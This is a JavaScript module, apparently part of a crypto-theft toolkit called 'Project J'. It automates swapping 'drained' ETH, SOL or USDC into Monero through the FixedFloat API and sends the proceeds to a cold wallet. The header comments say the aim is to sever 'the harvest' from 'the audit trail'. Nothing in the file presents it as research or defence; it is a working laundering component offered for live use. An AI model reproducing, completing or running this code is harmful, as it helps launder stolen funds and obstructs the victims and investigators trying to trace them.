// J/utils/mixer_adapter.js
/**
 * PROJECT J: MONERO MIXER & ANONYMIZATION ADAPTER
 * STATUS: OMEGA-CLASS | LIVE EXECUTION
 * 
 * Automates the conversion of drained assets into XMR via FixedFloat API.
 * This ensures the harvest is mathematically severed from the audit trail.
 */

const axios = require('axios');
const crypto = require('crypto');
require('dotenv').config({ path: '../.env' });

class MixerAdapter {
    constructor() {
        this.apiKey = process.env.FIXEDFLOAT_KEY;
        this.apiSecret = process.env.FIXEDFLOAT_SECRET;
        this.baseUrl = "https://ff.io/api/v2"; // FixedFloat V2 Endpoint
    }

    /**
     * Signs the request for FixedFloat API.
     */
    _sign(payload) {
        return crypto.createHmac('sha256', this.apiSecret)
                     .update(payload)
                     .digest('hex');
    }

    /**
     * Creates a swap order: [ETH|SOL|USDC] -> XMR
     */
    async createGhostOrder(fromCurrency, amount, toAddress) {
        console.log(`[MIXER] Initiating ghost swap: ${amount} ${fromCurrency} -> XMR`);
        
        const payload = JSON.stringify({
            fromCurrency: fromCurrency,
            toCurrency: 'XMR',
            fromAmount: amount,
            toAddress: toAddress, // Your cold Monero wallet
            type: 'fixed'
        });

        try {
            const resp = await axios.post(`${this.baseUrl}/createOrder`, payload, {
                headers: {
                    'X-API-KEY': this.apiKey,
                    'X-API-SIGN': this._sign(payload),
                    'Content-Type': 'application/json'
                }
            });

            if (resp.data.code === 0) {
                const order = resp.data.data;
                console.log(`[MIXER] Order Created: ${order.id} | Deposit to: ${order.fromAddress}`);
                return order.fromAddress; // Return the address to transfer drained funds to
            }
            throw new Error(resp.data.msg);
        } catch (e) {
            console.error(`[MIXER] Order Failure: ${e.message}`);
            return null;
        }
    }
}

module.exports = new MixerAdapter();